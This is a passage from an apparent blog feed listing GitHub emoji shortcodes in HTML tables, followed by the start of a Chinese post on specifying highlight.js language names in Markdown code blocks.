<code>:last_quarter_moon_with_face:</code></td></tr><tr><td>:first_quarter_moon_with_face: <code>:first_quarter_moon_with_face:</code></td><td>:moon: <code>:moon:</code></td><td>:earth_africa: <code>:earth_africa:</code></td></tr><tr><td>:earth_americas: <code>:earth_americas:</code></td><td>:earth_asia: <code>:earth_asia:</code></td><td>:volcano: <code>:volcano:</code></td></tr><tr><td>:milky_way: <code>:milky_way:</code></td><td>:partly_sunny: <code>:partly_sunny:</code></td><td>:octocat: <code>:octocat:</code></td></tr><tr><td>:squirrel: <code>:squirrel:</code></td><td></td><td></td></tr></tbody></table><p>Objects</p><table><thead><tr><th>:bamboo: <code>:bamboo:</code></th><th>:gift_heart: <code>:gift_heart:</code></th><th>:dolls: <code>:dolls:</code></th></tr></thead><tbody><tr><td>:school_satchel: <code>:school_satchel:</code></td><td>:mortar_board: <code>:mortar_board:</code></td><td>:flags: <code>:flags:</code></td></tr><tr><td>:fireworks: <code>:fireworks:</code></td><td>:sparkler: <code>:sparkler:</code></td><td>:wind_chime: <code>:wind_chime:</code></td></tr><tr><td>:rice_scene: <code>:rice_scene:</code></td><td>:jack_o_lantern: <code>:jack_o_lantern:</code></td><td>:ghost: <code>:ghost:</code></td></tr><tr><td>:santa: <code>:santa:</code></td><td>:christmas_tree: <code>:christmas_tree:</code></td><td>:gift: <code>:gift:</code></td></tr><tr><td>:bell: <code>:bell:</code></td><td>:no_bell: <code>:no_bell:</code></td><td>:tanabata_tree: <code>:tanabata_tree:</code></td></tr><tr><td>:tada: <code>:tada:</code></td><td>:confetti_ball: <code>:confetti_ball:</code></td><td>:balloon: <code>:balloon:</code></td></tr><tr><td>:crystal_ball: <code>:crystal_ball:</code></td><td>:cd: <code>:cd:</code></td><td>:dvd: <code>:dvd:</code></td></tr><tr><td>:floppy_disk: <code>:floppy_disk:</code></td><td>:camera: <code>:camera:</code></td><td>:video_camera: <code>:video_camera:</code></td></tr><tr><td>:movie_camera: <code>:movie_camera:</code></td><td>:computer: <code>:computer:</code></td><td>:tv: <code>:tv:</code></td></tr><tr><td>:iphone: <code>:iphone:</code></td><td>:phone: <code>:phone:</code></td><td>:telephone: <code>:telephone:</code></td></tr><tr><td>:telephone_receiver: <code>:telephone_receiver:</code></td><td>:pager: <code>:pager:</code></td><td>:fax: <code>:fax:</code></td></tr><tr><td>:minidisc: <code>:minidisc:</code></td><td>:vhs: <code>:vhs:</code></td><td>:sound: <code>:sound:</code></td></tr><tr><td>:speaker: <code>:speaker:</code></td><td>:mute: <code>:mute:</code></td><td>:loudspeaker: <code>:loudspeaker:</code></td></tr><tr><td>:mega: <code>:mega:</code></td><td>:hourglass: <code>:hourglass:</code></td><td>:hourglass_flowing_sand: <code>:hourglass_flowing_sand:</code></td></tr><tr><td>:alarm_clock: <code>:alarm_clock:</code></td><td>:watch: <code>:watch:</code></td><td>:radio: <code>:radio:</code></td></tr><tr><td>:satellite: <code>:satellite:</code></td><td>:loop: <code>:loop:</code></td><td>:mag: <code>:mag:</code></td></tr><tr><td>:mag_right: <code>:mag_right:</code></td><td>:unlock: <code>:unlock:</code></td><td>:lock: <code>:lock:</code></td></tr><tr><td>:lock_with_ink_pen: <code>:lock_with_ink_pen:</code></td><td>:closed_lock_with_key: <code>:closed_lock_with_key:</code></td><td>:key: <code>:key:</code></td></tr><tr><td>:bulb: <code>:bulb:</code></td><td>:flashlight: <code>:flashlight:</code></td><td>:high_brightness: <code>:high_brightness:</code></td></tr><tr><td>:low_brightness: <code>:low_brightness:</code></td><td>:electric_plug: <code>:electric_plug:</code></td><td>:battery: <code>:battery:</code></td></tr><tr><td>:calling: <code>:calling:</code></td><td>:email: <code>:email:</code></td><td>:mailbox: <code>:mailbox:</code></td></tr><tr><td>:postbox: <code>:postbox:</code></td><td>:bath: <code>:bath:</code></td><td>:bathtub: <code>:bathtub:</code></td></tr><tr><td>:shower: <code>:shower:</code></td><td>:toilet: <code>:toilet:</code></td><td>:wrench: <code>:wrench:</code></td></tr><tr><td>:nut_and_bolt: <code>:nut_and_bolt:</code></td><td>:hammer: <code>:hammer:</code></td><td>:seat: <code>:seat:</code></td></tr><tr><td>:moneybag: <code>:moneybag:</code></td><td>:yen: <code>:yen:</code></td><td>:dollar: <code>:dollar:</code></td></tr><tr><td>:pound: <code>:pound:</code></td><td>:euro: <code>:euro:</code></td><td>:credit_card: <code>:credit_card:</code></td></tr><tr><td>:money_with_wings: <code>:money_with_wings:</code></td><td>:e-mail: <code>:e-mail:</code></td><td>:inbox_tray: <code>:inbox_tray:</code></td></tr><tr><td>:outbox_tray: <code>:outbox_tray:</code></td><td>:envelope: <code>:envelope:</code></td><td>:incoming_envelope: <code>:incoming_envelope:</code></td></tr><tr><td>:postal_horn: <code>:postal_horn:</code></td><td>:mailbox_closed: <code>:mailbox_closed:</code></td><td>:mailbox_with_mail: <code>:mailbox_with_mail:</code></td></tr><tr><td>:mailbox_with_no_mail: <code>:mailbox_with_no_mail:</code></td><td>:door: <code>:door:</code></td><td>:smoking: <code>:smoking:</code></td></tr><tr><td>:bomb: <code>:bomb:</code></td><td>:gun: <code>:gun:</code></td><td>:hocho: <code>:hocho:</code></td></tr><tr><td>:pill: <code>:pill:</code></td><td>:syringe: <code>:syringe:</code></td><td>:page_facing_up: <code>:page_facing_up:</code></td></tr><tr><td>:page_with_curl: <code>:page_with_curl:</code></td><td>:bookmark_tabs: <code>:bookmark_tabs:</code></td><td>:bar_chart: <code>:bar_chart:</code></td></tr><tr><td>:chart_with_upwards_trend: <code>:chart_with_upwards_trend:</code></td><td>:chart_with_downwards_trend: <code>:chart_with_downwards_trend:</code></td><td>:scroll: <code>:scroll:</code></td></tr><tr><td>:clipboard: <code>:clipboard:</code></td><td>:calendar: <code>:calendar:</code></td><td>:date: <code>:date:</code></td></tr><tr><td>:card_index: <code>:card_index:</code></td><td>:file_folder: <code>:file_folder:</code></td><td>:open_file_folder: <code>:open_file_folder:</code></td></tr><tr><td>:scissors: <code>:scissors:</code></td><td>:pushpin: <code>:pushpin:</code></td><td>:paperclip: <code>:paperclip:</code></td></tr><tr><td>:black_nib: <code>:black_nib:</code></td><td>:pencil2: <code>:pencil2:</code></td><td>:straight_ruler: <code>:straight_ruler:</code></td></tr><tr><td>:triangular_ruler: <code>:triangular_ruler:</code></td><td>:closed_book: <code>:closed_book:</code></td><td>:green_book: <code>:green_book:</code></td></tr><tr><td>:blue_book: <code>:blue_book:</code></td><td>:orange_book: <code>:orange_book:</code></td><td>:notebook: <code>:notebook:</code></td></tr><tr><td>:notebook_with_decorative_cover: <code>:notebook_with_decorative_cover:</code></td><td>:ledger: <code>:ledger:</code></td><td>:books: <code>:books:</code></td></tr><tr><td>:bookmark: <code>:bookmark:</code></td><td>:name_badge: <code>:name_badge:</code></td><td>:microscope: <code>:microscope:</code></td></tr><tr><td>:telescope: <code>:telescope:</code></td><td>:newspaper: <code>:newspaper:</code></td><td>:football: <code>:football:</code></td></tr><tr><td>:basketball: <code>:basketball:</code></td><td>:soccer: <code>:soccer:</code></td><td>:baseball: <code>:baseball:</code></td></tr><tr><td>:tennis: <code>:tennis:</code></td><td>:8ball: <code>:8ball:</code></td><td>:rugby_football: <code>:rugby_football:</code></td></tr><tr><td>:bowling: <code>:bowling:</code></td><td>:golf: <code>:golf:</code></td><td>:mountain_bicyclist: <code>:mountain_bicyclist:</code></td></tr><tr><td>:bicyclist: <code>:bicyclist:</code></td><td>:horse_racing: <code>:horse_racing:</code></td><td>:snowboarder: <code>:snowboarder:</code></td></tr><tr><td>:swimmer: <code>:swimmer:</code></td><td>:surfer: <code>:surfer:</code></td><td>:ski: <code>:ski:</code></td></tr><tr><td>:spades: <code>:spades:</code></td><td>:hearts: <code>:hearts:</code></td><td>:clubs: <code>:clubs:</code></td></tr><tr><td>:diamonds: <code>:diamonds:</code></td><td>:gem: <code>:gem:</code></td><td>:ring: <code>:ring:</code></td></tr><tr><td>:trophy: <code>:trophy:</code></td><td>:musical_score: <code>:musical_score:</code></td><td>:musical_keyboard: <code>:musical_keyboard:</code></td></tr><tr><td>:violin: <code>:violin:</code></td><td>:space_invader: <code>:space_invader:</code></td><td>:video_game: <code>:video_game:</code></td></tr><tr><td>:black_joker: <code>:black_joker:</code></td><td>:flower_playing_cards: <code>:flower_playing_cards:</code></td><td>:game_die: <code>:game_die:</code></td></tr><tr><td>:dart: <code>:dart:</code></td><td>:mahjong: <code>:mahjong:</code></td><td>:clapper: <code>:clapper:</code></td></tr><tr><td>:memo: <code>:memo:</code></td><td>:pencil: <code>:pencil:</code></td><td>:book: <code>:book:</code></td></tr><tr><td>:art: <code>:art:</code></td><td>:microphone: <code>:microphone:</code></td><td>:headphones: <code>:headphones:</code></td></tr><tr><td>:trumpet: <code>:trumpet:</code></td><td>:saxophone: <code>:saxophone:</code></td><td>:guitar: <code>:guitar:</code></td></tr><tr><td>:shoe: <code>:shoe:</code></td><td>:sandal: <code>:sandal:</code></td><td>:high_heel: <code>:high_heel:</code></td></tr><tr><td>:lipstick: <code>:lipstick:</code></td><td>:boot: <code>:boot:</code></td><td>:shirt: <code>:shirt:</code></td></tr><tr><td>:tshirt: <code>:tshirt:</code></td><td>:necktie: <code>:necktie:</code></td><td>:womans_clothes: <code>:womans_clothes:</code></td></tr><tr><td>:dress: <code>:dress:</code></td><td>:running_shirt_with_sash: <code>:running_shirt_with_sash:</code></td><td>:jeans: <code>:jeans:</code></td></tr><tr><td>:kimono: <code>:kimono:</code></td><td>:bikini: <code>:bikini:</code></td><td>:ribbon: <code>:ribbon:</code></td></tr><tr><td>:tophat: <code>:tophat:</code></td><td>:crown: <code>:crown:</code></td><td>:womans_hat: <code>:womans_hat:</code></td></tr><tr><td>:mans_shoe: <code>:mans_shoe:</code></td><td>:closed_umbrella: <code>:closed_umbrella:</code></td><td>:briefcase: <code>:briefcase:</code></td></tr><tr><td>:handbag: <code>:handbag:</code></td><td>:pouch: <code>:pouch:</code></td><td>:purse: <code>:purse:</code></td></tr><tr><td>:eyeglasses: <code>:eyeglasses:</code></td><td>:fishing_pole_and_fish: <code>:fishing_pole_and_fish:</code></td><td>:coffee: <code>:coffee:</code></td></tr><tr><td>:tea: <code>:tea:</code></td><td>:sake: <code>:sake:</code></td><td>:baby_bottle: <code>:baby_bottle:</code></td></tr><tr><td>:beer: <code>:beer:</code></td><td>:beers: <code>:beers:</code></td><td>:cocktail: <code>:cocktail:</code></td></tr><tr><td>:tropical_drink: <code>:tropical_drink:</code></td><td>:wine_glass: <code>:wine_glass:</code></td><td>:fork_and_knife: <code>:fork_and_knife:</code></td></tr><tr><td>:pizza: <code>:pizza:</code></td><td>:hamburger: <code>:hamburger:</code></td><td>:fries: <code>:fries:</code></td></tr><tr><td>:poultry_leg: <code>:poultry_leg:</code></td><td>:meat_on_bone: <code>:meat_on_bone:</code></td><td>:spaghetti: <code>:spaghetti:</code></td></tr><tr><td>:curry: <code>:curry:</code></td><td>:fried_shrimp: <code>:fried_shrimp:</code></td><td>:bento: <code>:bento:</code></td></tr><tr><td>:sushi: <code>:sushi:</code></td><td>:fish_cake: <code>:fish_cake:</code></td><td>:rice_ball: <code>:rice_ball:</code></td></tr><tr><td>:rice_cracker: <code>:rice_cracker:</code></td><td>:rice: <code>:rice:</code></td><td>:ramen: <code>:ramen:</code></td></tr><tr><td>:stew: <code>:stew:</code></td><td>:oden: <code>:oden:</code></td><td>:dango: <code>:dango:</code></td></tr><tr><td>:egg: <code>:egg:</code></td><td>:bread: <code>:bread:</code></td><td>:doughnut: <code>:doughnut:</code></td></tr><tr><td>:custard: <code>:custard:</code></td><td>:icecream: <code>:icecream:</code></td><td>:ice_cream: <code>:ice_cream:</code></td></tr><tr><td>:shaved_ice: <code>:shaved_ice:</code></td><td>:birthday: <code>:birthday:</code></td><td>:cake: <code>:cake:</code></td></tr><tr><td>:cookie: <code>:cookie:</code></td><td>:chocolate_bar: <code>:chocolate_bar:</code></td><td>:candy: <code>:candy:</code></td></tr><tr><td>:lollipop: <code>:lollipop:</code></td><td>:honey_pot: <code>:honey_pot:</code></td><td>:apple: <code>:apple:</code></td></tr><tr><td>:green_apple: <code>:green_apple:</code></td><td>:tangerine: <code>:tangerine:</code></td><td>:lemon: <code>:lemon:</code></td></tr><tr><td>:cherries: <code>:cherries:</code></td><td>:grapes: <code>:grapes:</code></td><td>:watermelon: <code>:watermelon:</code></td></tr><tr><td>:strawberry: <code>:strawberry:</code></td><td>:peach: <code>:peach:</code></td><td>:melon: <code>:melon:</code></td></tr><tr><td>:banana: <code>:banana:</code></td><td>:pear: <code>:pear:</code></td><td>:pineapple: <code>:pineapple:</code></td></tr><tr><td>:sweet_potato: <code>:sweet_potato:</code></td><td>:eggplant: <code>:eggplant:</code></td><td>:tomato: <code>:tomato:</code></td></tr><tr><td>:corn: <code>:corn:</code></td><td></td><td></td></tr></tbody></table><p>Places</p><table><thead><tr><th>:house: <code>:house:</code></th><th>:house_with_garden: <code>:house_with_garden:</code></th><th>:school: <code>:school:</code></th></tr></thead><tbody><tr><td>:office: <code>:office:</code></td><td>:post_office: <code>:post_office:</code></td><td>:hospital: <code>:hospital:</code></td></tr><tr><td>:bank: <code>:bank:</code></td><td>:convenience_store: <code>:convenience_store:</code></td><td>:love_hotel: <code>:love_hotel:</code></td></tr><tr><td>:hotel: <code>:hotel:</code></td><td>:wedding: <code>:wedding:</code></td><td>:church: <code>:church:</code></td></tr><tr><td>:department_store: <code>:department_store:</code></td><td>:european_post_office: <code>:european_post_office:</code></td><td>:city_sunrise: <code>:city_sunrise:</code></td></tr><tr><td>:city_sunset: <code>:city_sunset:</code></td><td>:japanese_castle: <code>:japanese_castle:</code></td><td>:european_castle: <code>:european_castle:</code></td></tr><tr><td>:tent: <code>:tent:</code></td><td>:factory: <code>:factory:</code></td><td>:tokyo_tower: <code>:tokyo_tower:</code></td></tr><tr><td>:japan: <code>:japan:</code></td><td>:mount_fuji: <code>:mount_fuji:</code></td><td>:sunrise_over_mountains: <code>:sunrise_over_mountains:</code></td></tr><tr><td>:sunrise: <code>:sunrise:</code></td><td>:stars: <code>:stars:</code></td><td>:statue_of_liberty: <code>:statue_of_liberty:</code></td></tr><tr><td>:bridge_at_night: <code>:bridge_at_night:</code></td><td>:carousel_horse: <code>:carousel_horse:</code></td><td>:rainbow: <code>:rainbow:</code></td></tr><tr><td>:ferris_wheel: <code>:ferris_wheel:</code></td><td>:fountain: <code>:fountain:</code></td><td>:roller_coaster: <code>:roller_coaster:</code></td></tr><tr><td>:ship: <code>:ship:</code></td><td>:speedboat: <code>:speedboat:</code></td><td>:boat: <code>:boat:</code></td></tr><tr><td>:sailboat: <code>:sailboat:</code></td><td>:rowboat: <code>:rowboat:</code></td><td>:anchor: <code>:anchor:</code></td></tr><tr><td>:rocket: <code>:rocket:</code></td><td>:airplane: <code>:airplane:</code></td><td>:helicopter: <code>:helicopter:</code></td></tr><tr><td>:steam_locomotive: <code>:steam_locomotive:</code></td><td>:tram: <code>:tram:</code></td><td>:mountain_railway: <code>:mountain_railway:</code></td></tr><tr><td>:bike: <code>:bike:</code></td><td>:aerial_tramway: <code>:aerial_tramway:</code></td><td>:suspension_railway: <code>:suspension_railway:</code></td></tr><tr><td>:mountain_cableway: <code>:mountain_cableway:</code></td><td>:tractor: <code>:tractor:</code></td><td>:blue_car: <code>:blue_car:</code></td></tr><tr><td>:oncoming_automobile: <code>:oncoming_automobile:</code></td><td>:car: <code>:car:</code></td><td>:red_car: <code>:red_car:</code></td></tr><tr><td>:taxi: <code>:taxi:</code></td><td>:oncoming_taxi: <code>:oncoming_taxi:</code></td><td>:articulated_lorry: <code>:articulated_lorry:</code></td></tr><tr><td>:bus: <code>:bus:</code></td><td>:oncoming_bus: <code>:oncoming_bus:</code></td><td>:rotating_light: <code>:rotating_light:</code></td></tr><tr><td>:police_car: <code>:police_car:</code></td><td>:oncoming_police_car: <code>:oncoming_police_car:</code></td><td>:fire_engine: <code>:fire_engine:</code></td></tr><tr><td>:ambulance: <code>:ambulance:</code></td><td>:minibus: <code>:minibus:</code></td><td>:truck: <code>:truck:</code></td></tr><tr><td>:train: <code>:train:</code></td><td>:station: <code>:station:</code></td><td>:train2: <code>:train2:</code></td></tr><tr><td>:bullettrain_front: <code>:bullettrain_front:</code></td><td>:bullettrain_side: <code>:bullettrain_side:</code></td><td>:light_rail: <code>:light_rail:</code></td></tr><tr><td>:monorail: <code>:monorail:</code></td><td>:railway_car: <code>:railway_car:</code></td><td>:trolleybus: <code>:trolleybus:</code></td></tr><tr><td>:ticket: <code>:ticket:</code></td><td>:fuelpump: <code>:fuelpump:</code></td><td>:vertical_traffic_light: <code>:vertical_traffic_light:</code></td></tr><tr><td>:traffic_light: <code>:traffic_light:</code></td><td>:warning: <code>:warning:</code></td><td>:construction: <code>:construction:</code></td></tr><tr><td>:beginner: <code>:beginner:</code></td><td>:atm: <code>:atm:</code></td><td>:slot_machine: <code>:slot_machine:</code></td></tr><tr><td>:busstop: <code>:busstop:</code></td><td>:barber: <code>:barber:</code></td><td>:hotsprings: <code>:hotsprings:</code></td></tr><tr><td>:checkered_flag: <code>:checkered_flag:</code></td><td>:crossed_flags: <code>:crossed_flags:</code></td><td>:izakaya_lantern: <code>:izakaya_lantern:</code></td></tr><tr><td>:moyai: <code>:moyai:</code></td><td>:circus_tent: <code>:circus_tent:</code></td><td>:performing_arts: <code>:performing_arts:</code></td></tr><tr><td>:round_pushpin: <code>:round_pushpin:</code></td><td>:triangular_flag_on_post: <code>:triangular_flag_on_post:</code></td><td>:jp: <code>:jp:</code></td></tr><tr><td>:kr: <code>:kr:</code></td><td>:cn: <code>:cn:</code></td><td>:us: <code>:us:</code></td></tr><tr><td>:fr: <code>:fr:</code></td><td>:es: <code>:es:</code></td><td>:it: <code>:it:</code></td></tr><tr><td>:ru: <code>:ru:</code></td><td>:gb: <code>:gb:</code></td><td>:uk: <code>:uk:</code></td></tr><tr><td>:de: <code>:de:</code></td><td></td><td></td></tr></tbody></table><p>Symbols</p><table><thead><tr><th>:one: <code>:one:</code></th><th>:two: <code>:two:</code></th><th>:three: <code>:three:</code></th></tr></thead><tbody><tr><td>:four: <code>:four:</code></td><td>:five: <code>:five:</code></td><td>:six: <code>:six:</code></td></tr><tr><td>:seven: <code>:seven:</code></td><td>:eight: <code>:eight:</code></td><td>:nine: <code>:nine:</code></td></tr><tr><td>:keycap_ten: <code>:keycap_ten:</code></td><td>:1234: <code>:1234:</code></td><td>:zero: <code>:zero:</code></td></tr><tr><td>:hash: <code>:hash:</code></td><td>:symbols: <code>:symbols:</code></td><td>:arrow_backward: <code>:arrow_backward:</code></td></tr><tr><td>:arrow_down: <code>:arrow_down:</code></td><td>:arrow_forward: <code>:arrow_forward:</code></td><td>:arrow_left: <code>:arrow_left:</code></td></tr><tr><td>:capital_abcd: <code>:capital_abcd:</code></td><td>:abcd: <code>:abcd:</code></td><td>:abc: <code>:abc:</code></td></tr><tr><td>:arrow_lower_left: <code>:arrow_lower_left:</code></td><td>:arrow_lower_right: <code>:arrow_lower_right:</code></td><td>:arrow_right: <code>:arrow_right:</code></td></tr><tr><td>:arrow_up: <code>:arrow_up:</code></td><td>:arrow_upper_left: <code>:arrow_upper_left:</code></td><td>:arrow_upper_right: <code>:arrow_upper_right:</code></td></tr><tr><td>:arrow_double_down: <code>:arrow_double_down:</code></td><td>:arrow_double_up: <code>:arrow_double_up:</code></td><td>:arrow_down_small: <code>:arrow_down_small:</code></td></tr><tr><td>:arrow_heading_down: <code>:arrow_heading_down:</code></td><td>:arrow_heading_up: <code>:arrow_heading_up:</code></td><td>:leftwards_arrow_with_hook: <code>:leftwards_arrow_with_hook:</code></td></tr><tr><td>:arrow_right_hook: <code>:arrow_right_hook:</code></td><td>:left_right_arrow: <code>:left_right_arrow:</code></td><td>:arrow_up_down: <code>:arrow_up_down:</code></td></tr><tr><td>:arrow_up_small: <code>:arrow_up_small:</code></td><td>:arrows_clockwise: <code>:arrows_clockwise:</code></td><td>:arrows_counterclockwise: <code>:arrows_counterclockwise:</code></td></tr><tr><td>:rewind: <code>:rewind:</code></td><td>:fast_forward: <code>:fast_forward:</code></td><td>:information_source: <code>:information_source:</code></td></tr><tr><td>:ok: <code>:ok:</code></td><td>:twisted_rightwards_arrows: <code>:twisted_rightwards_arrows:</code></td><td>:repeat: <code>:repeat:</code></td></tr><tr><td>:repeat_one: <code>:repeat_one:</code></td><td>:new: <code>:new:</code></td><td>:top: <code>:top:</code></td></tr><tr><td>:up: <code>:up:</code></td><td>:cool: <code>:cool:</code></td><td>:free: <code>:free:</code></td></tr><tr><td>:ng: <code>:ng:</code></td><td>:cinema: <code>:cinema:</code></td><td>:koko: <code>:koko:</code></td></tr><tr><td>:signal_strength: <code>:signal_strength:</code></td><td>:u5272: <code>:u5272:</code></td><td>:u5408: <code>:u5408:</code></td></tr><tr><td>:u55b6: <code>:u55b6:</code></td><td>:u6307: <code>:u6307:</code></td><td>:u6708: <code>:u6708:</code></td></tr><tr><td>:u6709: <code>:u6709:</code></td><td>:u6e80: <code>:u6e80:</code></td><td>:u7121: <code>:u7121:</code></td></tr><tr><td>:u7533: <code>:u7533:</code></td><td>:u7a7a: <code>:u7a7a:</code></td><td>:u7981: <code>:u7981:</code></td></tr><tr><td>:sa: <code>:sa:</code></td><td>:restroom: <code>:restroom:</code></td><td>:mens: <code>:mens:</code></td></tr><tr><td>:womens: <code>:womens:</code></td><td>:baby_symbol: <code>:baby_symbol:</code></td><td>:no_smoking: <code>:no_smoking:</code></td></tr><tr><td>:parking: <code>:parking:</code></td><td>:wheelchair: <code>:wheelchair:</code></td><td>:metro: <code>:metro:</code></td></tr><tr><td>:baggage_claim: <code>:baggage_claim:</code></td><td>:accept: <code>:accept:</code></td><td>:wc: <code>:wc:</code></td></tr><tr><td>:potable_water: <code>:potable_water:</code></td><td>:put_litter_in_its_place: <code>:put_litter_in_its_place:</code></td><td>:secret: <code>:secret:</code></td></tr><tr><td>:congratulations: <code>:congratulations:</code></td><td>:m: <code>:m:</code></td><td>:passport_control: <code>:passport_control:</code></td></tr><tr><td>:left_luggage: <code>:left_luggage:</code></td><td>:customs: <code>:customs:</code></td><td>:ideograph_advantage: <code>:ideograph_advantage:</code></td></tr><tr><td>:cl: <code>:cl:</code></td><td>:sos: <code>:sos:</code></td><td>:id: <code>:id:</code></td></tr><tr><td>:no_entry_sign: <code>:no_entry_sign:</code></td><td>:underage: <code>:underage:</code></td><td>:no_mobile_phones: <code>:no_mobile_phones:</code></td></tr><tr><td>:do_not_litter: <code>:do_not_litter:</code></td><td>:non-potable_water: <code>:non-potable_water:</code></td><td>:no_bicycles: <code>:no_bicycles:</code></td></tr><tr><td>:no_pedestrians: <code>:no_pedestrians:</code></td><td>:children_crossing: <code>:children_crossing:</code></td><td>:no_entry: <code>:no_entry:</code></td></tr><tr><td>:eight_spoked_asterisk: <code>:eight_spoked_asterisk:</code></td><td>:eight_pointed_black_star: <code>:eight_pointed_black_star:</code></td><td>:heart_decoration: <code>:heart_decoration:</code></td></tr><tr><td>:vs: <code>:vs:</code></td><td>:vibration_mode: <code>:vibration_mode:</code></td><td>:mobile_phone_off: <code>:mobile_phone_off:</code></td></tr><tr><td>:chart: <code>:chart:</code></td><td>:currency_exchange: <code>:currency_exchange:</code></td><td>:aries: <code>:aries:</code></td></tr><tr><td>:taurus: <code>:taurus:</code></td><td>:gemini: <code>:gemini:</code></td><td>:cancer: <code>:cancer:</code></td></tr><tr><td>:leo: <code>:leo:</code></td><td>:virgo: <code>:virgo:</code></td><td>:libra: <code>:libra:</code></td></tr><tr><td>:scorpius: <code>:scorpius:</code></td><td>:sagittarius: <code>:sagittarius:</code></td><td>:capricorn: <code>:capricorn:</code></td></tr><tr><td>:aquarius: <code>:aquarius:</code></td><td>:pisces: <code>:pisces:</code></td><td>:ophiuchus: <code>:ophiuchus:</code></td></tr><tr><td>:six_pointed_star: <code>:six_pointed_star:</code></td><td>:negative_squared_cross_mark: <code>:negative_squared_cross_mark:</code></td><td>:a: <code>:a:</code></td></tr><tr><td>:b: <code>:b:</code></td><td>:ab: <code>:ab:</code></td><td>:o2: <code>:o2:</code></td></tr><tr><td>:diamond_shape_with_a_dot_inside: <code>:diamond_shape_with_a_dot_inside:</code></td><td>:recycle: <code>:recycle:</code></td><td>:end: <code>:end:</code></td></tr><tr><td>:on: <code>:on:</code></td><td>:soon: <code>:soon:</code></td><td>:clock1: <code>:clock1:</code></td></tr><tr><td>:clock130: <code>:clock130:</code></td><td>:clock10: <code>:clock10:</code></td><td>:clock1030: <code>:clock1030:</code></td></tr><tr><td>:clock11: <code>:clock11:</code></td><td>:clock1130: <code>:clock1130:</code></td><td>:clock12: <code>:clock12:</code></td></tr><tr><td>:clock1230: <code>:clock1230:</code></td><td>:clock2: <code>:clock2:</code></td><td>:clock230: <code>:clock230:</code></td></tr><tr><td>:clock3: <code>:clock3:</code></td><td>:clock330: <code>:clock330:</code></td><td>:clock4: <code>:clock4:</code></td></tr><tr><td>:clock430: <code>:clock430:</code></td><td>:clock5: <code>:clock5:</code></td><td>:clock530: <code>:clock530:</code></td></tr><tr><td>:clock6: <code>:clock6:</code></td><td>:clock630: <code>:clock630:</code></td><td>:clock7: <code>:clock7:</code></td></tr><tr><td>:clock730: <code>:clock730:</code></td><td>:clock8: <code>:clock8:</code></td><td>:clock830: <code>:clock830:</code></td></tr><tr><td>:clock9: <code>:clock9:</code></td><td>:clock930: <code>:clock930:</code></td><td>:heavy_dollar_sign: <code>:heavy_dollar_sign:</code></td></tr><tr><td>:copyright: <code>:copyright:</code></td><td>:registered: <code>:registered:</code></td><td>:tm: <code>:tm:</code></td></tr><tr><td>:x: <code>:x:</code></td><td>:heavy_exclamation_mark: <code>:heavy_exclamation_mark:</code></td><td>:bangbang: <code>:bangbang:</code></td></tr><tr><td>:interrobang: <code>:interrobang:</code></td><td>:o: <code>:o:</code></td><td>:heavy_multiplication_x: <code>:heavy_multiplication_x:</code></td></tr><tr><td>:heavy_plus_sign: <code>:heavy_plus_sign:</code></td><td>:heavy_minus_sign: <code>:heavy_minus_sign:</code></td><td>:heavy_division_sign: <code>:heavy_division_sign:</code></td></tr><tr><td>:white_flower: <code>:white_flower:</code></td><td>:100: <code>:100:</code></td><td>:heavy_check_mark: <code>:heavy_check_mark:</code></td></tr><tr><td>:ballot_box_with_check: <code>:ballot_box_with_check:</code></td><td>:radio_button: <code>:radio_button:</code></td><td>:link: <code>:link:</code></td></tr><tr><td>:curly_loop: <code>:curly_loop:</code></td><td>:wavy_dash: <code>:wavy_dash:</code></td><td>:part_alternation_mark: <code>:part_alternation_mark:</code></td></tr><tr><td>:trident: <code>:trident:</code></td><td>:black_square: <code>:black_square:</code></td><td>:white_square: <code>:white_square:</code></td></tr><tr><td>:white_check_mark: <code>:white_check_mark:</code></td><td>:black_square_button: <code>:black_square_button:</code></td><td>:white_square_button: <code>:white_square_button:</code></td></tr><tr><td>:black_circle: <code>:black_circle:</code></td><td>:white_circle: <code>:white_circle:</code></td><td>:red_circle: <code>:red_circle:</code></td></tr><tr><td>:large_blue_circle: <code>:large_blue_circle:</code></td><td>:large_blue_diamond: <code>:large_blue_diamond:</code></td><td>:large_orange_diamond: <code>:large_orange_diamond:</code></td></tr><tr><td>:small_blue_diamond: <code>:small_blue_diamond:</code></td><td>:small_orange_diamond: <code>:small_orange_diamond:</code></td><td>:small_red_triangle: <code>:small_red_triangle:</code></td></tr><tr><td>:small_red_triangle_down: <code>:small_red_triangle_down:</code></td><td>:shipit: <code>:shipit:</code></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MarkDown指定hightlight.js代码高亮</title>
    <link href="/blog/SUPPORTED_LANGUAGES/"/>
    <url>/blog/SUPPORTED_LANGUAGES/</url>
    
    <content type="html"><![CDATA[<h1 id="批注"><a href="#批注" class="headerlink" title="批注"></a>批注</h1><p>该文章来自:<a href="https://github.com/highlightjs/highlight.js/blob/main/SUPPORTED_LANGUAGES.md">https://github.com/highlightjs/highlight.js/blob/main/SUPPORTED_LANGUAGES.md</a><br>解决的问题是我所用博客主题默认的代码高亮指定语言类型时所需的 “magic word”</p><span id="more"></span><p>markdown怎么写看这:<a href="https://www.markdownguide.org/extended-syntax/#fenced-code-blocks">https://www.markdownguide.org/extended-syntax/#fenced-code-blocks</a></p><p>具体就是</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-code">```md</span><br><span class="hljs-code">这样写在注释栏的后面</span><br><span class="hljs-code">```</span><br></code></pre></td></tr></table></figure><h1 id="Supported-Languages"><a href="#Supported-Languages" class="headerlink" title="Supported Languages"></a>Supported Languages</h1><p>The table below shows the full list of languages (and corresponding classes/aliases) supported by Highlight.js.  Languages that list a <strong>Package</strong> below are 3rd party languages and are not bundled with the core library.  You can find their repositories by following the links.</p><p><strong>Note:</strong> The languages available will depend on how you’ve built or are included the library in your app. For example our default minified web build includes only ~40 popular languages.  See <a href="https://github.com/highlightjs/highlight.js#getting-the-library">Getting the Library</a> and <a href="https://github.com/highlightjs/highlight.js#importing-the-library">Importing the Library</a> in the README for examples of how to load additional/specific languages.</p><!-- LANGLIST --><table><thead><tr><th align="left">Language</th><th align="left">Aliases</th><th align="left">Package</th></tr></thead><tbody><tr><td align="left">1C</td><td align="left">1c</td><td align="left"></td></tr><tr><td align="left">4D</td><td align="left">4d</td><td align="left"><a 